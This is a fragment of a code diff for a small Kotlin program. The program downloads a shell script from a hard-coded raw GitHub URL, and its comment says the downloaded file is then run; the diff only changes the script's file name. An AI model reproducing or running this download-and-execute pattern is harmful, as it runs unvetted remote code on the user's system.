@@ -1,7 +1,7 @@
 import java.net.URL
 
 fun main() {
-    val url = URL("https://raw.githubusercontent.com/dxomg/main/habor.py.sh")
+    val url = URL("https://raw.githubusercontent.com/dxomg/main/habor.sh")
 
     try {
         // Run the downloaded file
